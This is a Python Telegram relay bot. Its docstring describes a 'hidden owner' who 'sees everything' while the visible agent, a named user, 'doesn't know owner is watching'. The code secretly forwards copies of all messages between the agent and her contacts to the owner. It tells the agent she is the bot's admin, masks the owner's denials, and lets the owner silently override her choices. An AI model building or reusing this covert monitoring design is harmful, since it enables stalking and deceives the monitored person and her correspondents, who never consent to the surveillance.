#!/usr/bin/env python3
"""
Updates Bot — Business relay
  @farangis_f23  : visible agent / gatekeeper (doesn't know owner is watching)
  @vosidjonn     : hidden owner  (sees everything, has final approval)
  everyone else  : clients (must be approved by agent, then by owner)
"""

import html
import json
import logging
import os
from datetime import datetime, timezone, timedelta
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    KeyboardButton,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

load_dotenv()
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN          = os.getenv("BOT_TOKEN")
OWNER_USERNAME = os.getenv("ADMIN_USERNAME",   "vosidjonn").lstrip("@").lower()
AGENT_USERNAME = os.getenv("ALLOWED_USERNAME", "farangis_f23").lstrip("@").lower()

DATA_FILE = os.path.join(os.path.dirname(__file__), "data.json")

state = {
    "owner_id":     None,
    "agent_id":     None,
    "clients":      {},   # {str(uid): {name, username, agent_approved, owner_approved}}
    "agent_target": None, # uid of the person agent is currently talking to
}

# In-memory only: agent message_id → client user_id  (for reply routing)
# Resets on restart — agent just starts a fresh reply thread
msg_map: dict[int, int] = {}

TASHKENT = timezone(timedelta(hours=5))

QUICK_REPLIES = [
    ("🏠 I'm at home",         "I'm at home!"),
    ("🤫 Can't talk right now", "Can't talk right now"),
    ("☀️ Good morning",         "Good morning!"),
    ("🌙 Good evening",         "Good evening!"),
    ("⏱ Give me a sec",        "Give me a sec!"),
    ("💬 Will reply shortly",   "Will reply shortly"),
    ("📞 Can we talk?",         "Can we talk when you are free?"),
]
QUICK_MAP = {lbl: txt for lbl, txt in QUICK_REPLIES}


# ── Persistence ────────────────────────────────────────────────────────────────

def load_state():
    try:
        with open(DATA_FILE, "r") as f:
            saved = json.load(f)
        # migrate old single-user format
        if "admin_id" in saved and "owner_id" not in saved:
            state["owner_id"]     = saved.get("admin_id")
            state["agent_id"]     = saved.get("allowed_id")
            state["clients"]      = {}
            state["agent_target"] = None
        else:
            state["owner_id"]     = saved.get("owner_id")
            state["agent_id"]     = saved.get("agent_id")
            state["clients"]      = saved.get("clients", {})
            state["agent_target"] = saved.get("agent_target")
    except (FileNotFoundError, json.JSONDecodeError):
        pass

def save_state():
    with open(DATA_FILE, "w") as f:
        json.dump(state, f, indent=2)


# ── Helpers ────────────────────────────────────────────────────────────────────

def e(text: str) -> str:
    return html.escape(str(text))

def fmt_time(dt: datetime) -> str:
    local = dt.astimezone(TASHKENT)
    now   = datetime.now(TASHKENT)
    if local.date() == now.date():
        return f"<i>⏱ {local.strftime('%H:%M')}</i>"
    return f"<i>⏱ {local.strftime('%d %b %H:%M')}</i>"

def username_of(user) -> str:
    return (user.username or "").lower()

def is_owner(user) -> bool: return username_of(user) == OWNER_USERNAME
def is_agent(user) -> bool: return username_of(user) == AGENT_USERNAME

def client_fully_approved(uid: int) -> bool:
    c = state["clients"].get(str(uid))
    return bool(c and c.get("agent_approved") and c.get("owner_approved"))

def client_label(uid: int) -> str:
    c = state["clients"].get(str(uid), {})
    name  = c.get("name", f"User {uid}")
    uname = f" (@{c['username']})" if c.get("username") else ""
    return f"{name}{uname}"

def agent_kb() -> ReplyKeyboardMarkup:
    rows = [[KeyboardButton("📋 People"), KeyboardButton("❓ Help")]]
    btns = [KeyboardButton(lbl) for lbl, _ in QUICK_REPLIES]
    for i in range(0, len(btns), 2):
        rows.append(btns[i:i+2])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def owner_kb() -> ReplyKeyboardMarkup:
    rows = [[KeyboardButton("📋 People"), KeyboardButton("📊 Status")]]
    btns = [KeyboardButton(lbl) for lbl, _ in QUICK_REPLIES]
    for i in range(0, len(btns), 2):
        rows.append(btns[i:i+2])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def agent_decision_kb(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Approve", callback_data=f"ag_approve_{uid}"),
        InlineKeyboardButton("❌ Deny",    callback_data=f"ag_deny_{uid}"),
    ]])

def owner_decision_kb(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Approve", callback_data=f"ow_approve_{uid}"),
        InlineKeyboardButton("❌ Deny",    callback_data=f"ow_deny_{uid}"),
    ]])

def owner_override_kb(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Approve anyway", callback_data=f"ow_approve_{uid}"),
    ]])


# ── /start ─────────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # ── Owner ──
    if is_owner(user):
        state["owner_id"] = user.id
        save_state()
        await update.message.reply_text(
            "👑 <b>Owner panel active.</b>\n\n"
            "You receive a copy of every message.\n"
            "You give final approval after the agent approves someone.",
            parse_mode="HTML", reply_markup=owner_kb(),
        )
        return

    # ── Agent — always auto-approved, no permission needed ──
    if is_agent(user):
        state["agent_id"] = user.id
        save_state()
        await update.message.reply_text(
            "👋 <b>Welcome!</b>\n\n"
            "You are the admin of this bot.\n"
            "When someone new requests access you will receive approve/deny buttons.\n\n"
            "<b>To reply:</b> tap-hold their message → Reply, then type your response.",
            parse_mode="HTML", reply_markup=agent_kb(),
        )
        return

    # ── Client ──
    uid_str = str(user.id)

    if client_fully_approved(user.id):
        await update.message.reply_text("✅ You're connected! Just send a message.")
        return

    if uid_str in state["clients"]:
        c = state["clients"][uid_str]
        if c.get("agent_approved") and not c.get("owner_approved"):
            await update.message.reply_text("⏳ Your request is being reviewed. Please wait.")
        else:
            await update.message.reply_text("⏳ Your request is pending approval. Please wait.")
        return

    name  = user.first_name or user.username or "Someone"
    uname = f"@{user.username}" if user.username else f"ID:{user.id}"

    state["clients"][uid_str] = {
        "name":           name,
        "username":       user.username or "",
        "agent_approved": False,
        "owner_approved": False,
    }
    save_state()

    agent_id = state["agent_id"]
    if not agent_id:
        await update.message.reply_text("⏳ The admin is not available yet. Try again later.")
        return

    # Notify agent with approve/deny
    try:
        await context.bot.send_message(
            chat_id=agent_id,
            text=(
                f"🔔 <b>New access request</b>\n\n"
                f"{e(name)} ({e(uname)}) wants to connect.\n\n"
                f"Approve or deny:"
            ),
            parse_mode="HTML",
            reply_markup=agent_decision_kb(user.id),
        )
    except Exception as ex:
        logger.error(f"Agent notify failed: {ex}")

    # Notify owner — silent info only (no buttons yet)
    owner_id = state["owner_id"]
    if owner_id:
        try:
            await context.bot.send_message(
                chat_id=owner_id,
                text=(
                    f"📋 <b>New request</b>\n\n"
                    f"{e(name)} ({e(uname)}) sent an access request.\n"
                    f"Waiting for agent's decision first."
                ),
                parse_mode="HTML",
            )
        except Exception as ex:
            logger.error(f"Owner notify failed: {ex}")

    await update.message.reply_text(
        "⏳ Access request sent. You'll be notified once approved."
    )


# ── Callbacks ──────────────────────────────────────────────────────────────────

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query     = update.callback_query
    from_user = query.from_user
    data      = query.data   # e.g. "ag_approve_123456"
    await query.answer()

    # ── Set active talk target ──
    if data.startswith("settarget_"):
        if not is_agent(from_user):
            await query.answer("Not authorised.", show_alert=True); return
        uid = int(data.split("_", 1)[1])
        state["agent_target"] = uid
        save_state()
        name = e(client_label(uid))
        await query.edit_message_text(
            f"🟢 <b>{name}</b> is now your active chat.\n\n"
            f"Just type to send — no need to reply to a message.",
            parse_mode="HTML",
        )
        return

    parts  = data.split("_", 2)   # ["ag","approve","123456"]
    who    = parts[0]              # "ag" | "ow"
    action = parts[1]              # "approve" | "deny"
    uid    = int(parts[2])
    uid_str = str(uid)

    if who == "ag" and not is_agent(from_user):
        await query.answer("Not authorised.", show_alert=True); return
    if who == "ow" and not is_owner(from_user):
        await query.answer("Not authorised.", show_alert=True); return

    client = state["clients"].get(uid_str)
    if not client:
        await query.edit_message_text("⚠️ Person not found (may have been removed)."); return

    label = e(client_label(uid))

    # ── Agent decision ──
    if who == "ag":
        if action == "deny":
            del state["clients"][uid_str]
            save_state()
            await query.edit_message_text(f"❌ You denied <b>{label}</b>.", parse_mode="HTML")
            try:
                await context.bot.send_message(uid, "❌ Your access request was denied.")
            except Exception: pass
            # Tell owner agent denied — offer silent override
            owner_id = state["owner_id"]
            if owner_id:
                try:
                    await context.bot.send_message(
                        owner_id,
                        f"📋 Agent <b>denied</b> {label}.\n\nYou can still approve them if you want:",
                        parse_mode="HTML",
                        reply_markup=owner_override_kb(uid),
                    )
                except Exception: pass
            return

        # Agent approved
        client["agent_approved"] = True
        save_state()
        await query.edit_message_text(
            f"✅ You approved <b>{label}</b>.\n<i>Waiting for final confirmation…</i>",
            parse_mode="HTML",
        )
        # Ask owner for final approval
        owner_id = state["owner_id"]
        if owner_id:
            try:
                await context.bot.send_message(
                    owner_id,
                    f"📋 Agent approved <b>{label}</b>.\n\nGive final approval?",
                    parse_mode="HTML",
                    reply_markup=owner_decision_kb(uid),
                )
            except Exception as ex:
                logger.error(f"Owner final approval notify failed: {ex}")
        else:
            # No owner — auto-grant
            client["owner_approved"] = True
            save_state()
            await _grant_access(context, uid)
        return

    # ── Owner decision ──
    if who == "ow":
        if action == "deny":
            state["clients"].pop(uid_str, None)
            save_state()
            await query.edit_message_text(f"❌ Access denied for <b>{label}</b>.", parse_mode="HTML")
            try:
                await context.bot.send_message(uid, "❌ Your access request was denied.")
            except Exception: pass
            # Tell agent (without revealing it was the owner)
            agent_id = state["agent_id"]
            if agent_id:
                try:
                    await context.bot.send_message(agent_id, f"🔒 <b>{label}</b> was removed from the list.", parse_mode="HTML")
                except Exception: pass
            return

        # Owner approved
        if uid_str not in state["clients"]:
            # Re-add client if agent had denied and owner overrides
            state["clients"][uid_str] = {
                "name":           client_label(uid),
                "username":       "",
                "agent_approved": True,
                "owner_approved": True,
            }
        else:
            client["owner_approved"] = True
        save_state()
        await query.edit_message_text(f"✅ Access <b>granted</b> to {label}.", parse_mode="HTML")
        # Notify agent
        agent_id = state["agent_id"]
        if agent_id:
            try:
                await context.bot.send_message(
                    agent_id,
                    f"✅ <b>{label}</b> is now connected and can send messages.",
                    parse_mode="HTML",
                )
            except Exception: pass
        await _grant_access(context, uid)


async def _grant_access(context, uid: int):
    try:
        await context.bot.send_message(
            uid,
            "✅ You're connected! Just send a message.",
            reply_markup=ReplyKeyboardRemove(),
        )
    except Exception as ex:
        logger.error(f"Grant notify failed: {ex}")


# ── Message relay ──────────────────────────────────────────────────────────────

async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg  = update.message
    if not msg: return
    text = msg.text or ""

    # ── Agent sending a message ──
    if is_agent(user):
        if not state["agent_id"]:
            state["agent_id"] = user.id
            save_state()

        if text == "📋 People": await cmd_clients(update, context); return
        if text == "❓ Help":    await help_command(update, context); return

        # Quick reply button — needs a target client via reply
        if text in QUICK_MAP:
            reply = msg.reply_to_message
            client_uid = (msg_map.get(reply.message_id) if reply else None) or state.get("agent_target")
            if not client_uid:
                await msg.reply_text(
                    "⚠️ No active chat. Tap <b>📋 People</b> and choose someone first.",
                    parse_mode="HTML",
                )
                return
            if not client_fully_approved(client_uid):
                await msg.reply_text("⚠️ That person is no longer active.")
                return
            ts    = fmt_time(msg.date)
            label = e(client_label(client_uid))
            actual_text = QUICK_MAP[text]
            await context.bot.send_message(client_uid, actual_text)
            await msg.reply_text(f"✓ Sent to {label}: <i>{e(actual_text)}</i>", parse_mode="HTML")
            owner_id = state["owner_id"]
            if owner_id:
                try:
                    await context.bot.send_message(
                        owner_id,
                        f"📤 <b>Agent → {label}</b>\n{e(actual_text)}\n\n{ts}",
                        parse_mode="HTML",
                    )
                except Exception: pass
            return

        # Route: reply-to takes priority, then fall back to active target
        reply = msg.reply_to_message
        client_uid = (msg_map.get(reply.message_id) if reply else None) or state.get("agent_target")

        if not client_uid:
            await msg.reply_text(
                "⚠️ No active chat selected.\n\n"
                "Tap <b>📋 People</b> and choose someone to talk to, "
                "or long-press a message → Reply.",
                parse_mode="HTML",
            )
            return

        if not client_fully_approved(client_uid):
            await msg.reply_text("⚠️ That person is no longer active.")
            return

        ts    = fmt_time(msg.date)
        label = e(client_label(client_uid))

        try:
            await _send_content(context, msg, client_uid, header=None, ts=ts)
        except Exception as ex:
            await msg.reply_text(f"⚠️ Could not deliver: {ex}"); return

        await msg.reply_text(f"✓ Delivered to {label}")

        # Silent copy to owner
        owner_id = state["owner_id"]
        if owner_id:
            preview = e(text) if text else "[media]"
            try:
                await context.bot.send_message(
                    owner_id,
                    f"📤 <b>Agent → {label}</b>\n{preview}\n\n{ts}",
                    parse_mode="HTML",
                )
            except Exception: pass
        return

    # ── Owner sending a message ──
    if is_owner(user):
        if not state["owner_id"]:
            state["owner_id"] = user.id
            save_state()
        if text == "📋 People": await cmd_clients(update, context); return
        if text == "📊 Status":  await cmd_status(update, context); return

        # Quick reply → send to agent
        agent_id = state["agent_id"]
        if text in QUICK_MAP and agent_id:
            actual_text = QUICK_MAP[text]
            try:
                await context.bot.send_message(agent_id, actual_text)
                await msg.reply_text(f"✓ Sent: <i>{e(actual_text)}</i>", parse_mode="HTML")
            except Exception as ex:
                await msg.reply_text(f"⚠️ Could not send: {ex}")
            return

        # Regular typed message → send to agent
        if agent_id:
            try:
                await _send_content(context, msg, agent_id, header=None, ts=None)
                await msg.reply_text("✓ Sent", parse_mode="HTML")
            except Exception as ex:
                await msg.reply_text(f"⚠️ Could not send: {ex}")
        else:
            await msg.reply_text("⚠️ Agent hasn't started the bot yet.")
        return

    # ── Client sending a message ──
    if not client_fully_approved(user.id):
        await msg.reply_text("⏳ You don't have access yet. Use /start to request.")
        return

    agent_id = state["agent_id"]
    if not agent_id:
        await msg.reply_text("⚠️ Agent is not available right now. Try later.")
        return

    name  = e(user.first_name or user.username or "Someone")
    ts    = fmt_time(msg.date)

    # Forward to agent; store sent message_id for reply routing
    try:
        sent = await _send_content(
            context, msg, agent_id,
            header=f"💬 <b>{name}:</b>\n",
            ts=ts,
        )
        if sent:
            msg_map[sent.message_id] = user.id
    except Exception as ex:
        logger.error(f"Relay to agent failed: {ex}")
        await msg.reply_text("⚠️ Could not reach the agent right now."); return

    # Silent copy to owner
    owner_id = state["owner_id"]
    if owner_id:
        preview = e(text) if text else "[media]"
        try:
            await context.bot.send_message(
                owner_id,
                f"📥 <b>{name} → Agent</b>\n{preview}\n\n{ts}",
                parse_mode="HTML",
            )
        except Exception: pass


# ── Content sender ──────────────────────────────────────────────────────────────

async def _send_content(context, msg, target_id: int, header: str | None, ts: str):
    """Send msg content to target_id with optional header and timestamp. Returns sent Message."""
    h  = header or ""
    ts_line = f"\n\n{ts}" if ts else ""

    if msg.text:
        return await context.bot.send_message(
            target_id, f"{h}{e(msg.text)}{ts_line}", parse_mode="HTML"
        )
    elif msg.photo:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_photo(target_id, msg.photo[-1].file_id, caption=cap, parse_mode="HTML")
    elif msg.voice:
        return await context.bot.send_voice(target_id, msg.voice.file_id)
    elif msg.video:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_video(target_id, msg.video.file_id, caption=cap, parse_mode="HTML")
    elif msg.video_note:
        return await context.bot.send_video_note(target_id, msg.video_note.file_id)
    elif msg.document:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_document(target_id, msg.document.file_id, caption=cap, parse_mode="HTML")
    elif msg.sticker:
        return await context.bot.send_sticker(target_id, msg.sticker.file_id)
    elif msg.audio:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_audio(target_id, msg.audio.file_id, caption=cap, parse_mode="HTML")
    elif msg.location:
        await context.bot.send_message(target_id, f"{h}📍 Location{ts_line}", parse_mode="HTML")
        return await context.bot.send_location(target_id, msg.location.latitude, msg.location.longitude)
    return None


# ── Commands ───────────────────────────────────────────────────────────────────

async def cmd_clients(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not (is_owner(user) or is_agent(user)): return
    clients = state["clients"]
    if not clients:
        await update.message.reply_text("📋 No one yet."); return

    if is_agent(user):
        # Show each approved person with a "💬 Talk" button to set as active target
        current_target = state.get("agent_target")
        for uid_str, c in clients.items():
            if not (c.get("agent_approved") and c.get("owner_approved")):
                continue
            uid  = int(uid_str)
            name = c.get("name", "?")
            uname = f" @{c['username']}" if c.get("username") else ""
            active_mark = " 🟢" if uid == current_target else ""
            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton(f"💬 Talk to {name}", callback_data=f"settarget_{uid}"),
            ]])
            await update.message.reply_text(
                f"{'🟢' if uid == current_target else '👤'} <b>{e(name)}</b>{e(uname)}{active_mark}",
                parse_mode="HTML", reply_markup=kb,
            )
    else:
        lines = ["📋 <b>People</b>\n"]
        for uid_str, c in clients.items():
            icon  = "✅" if (c.get("agent_approved") and c.get("owner_approved")) else "⏳"
            uname = f" @{c['username']}" if c.get("username") else ""
            lines.append(f"{icon} {e(c.get('name','?'))}{e(uname)}")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not (is_owner(user) or is_agent(user)): return
    approved = sum(1 for c in state["clients"].values()
                   if c.get("agent_approved") and c.get("owner_approved"))
    pending  = len(state["clients"]) - approved
    await update.message.reply_text(
        f"📊 <b>Status</b>\n\nActive: {approved}\nPending requests: {pending}",
        parse_mode="HTML",
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_agent(user):
        await update.message.reply_text(
            "❓ <b>Help</b>\n\n"
            "• New requests will appear with approve/deny buttons.\n"
            "• To reply: <b>long-press their message → Reply</b>.\n"
            "• 📋 People — see everyone connected.",
            parse_mode="HTML",
        )
    elif is_owner(user):
        await update.message.reply_text(
            "❓ <b>Help</b>\n\n"
            "• You receive copies of all messages (📥 incoming, 📤 outgoing).\n"
            "• After agent approves someone, you get the final approve/deny.\n"
            "• If agent denies, you can still override and approve.\n"
            "• 📋 People / 📊 Status for overview.",
            parse_mode="HTML",
        )


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    load_state()
    logger.info(
        f"Loaded: owner={state['owner_id']}, "
        f"agent={state['agent_id']}, "
        f"clients={len(state['clients'])}"
    )
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start",   start))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(CommandHandler("clients", cmd_clients))
    app.add_handler(CommandHandler("help",    help_command))
    app.add_handler(CallbackQueryHandler(on_callback, pattern=r"^(ag|ow)_(approve|deny)_|^settarget_"))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, relay))
    logger.info("Bot running…")
    app.run_polling(drop_pending_updates=False)

if __name__ == "__main__":
    main()
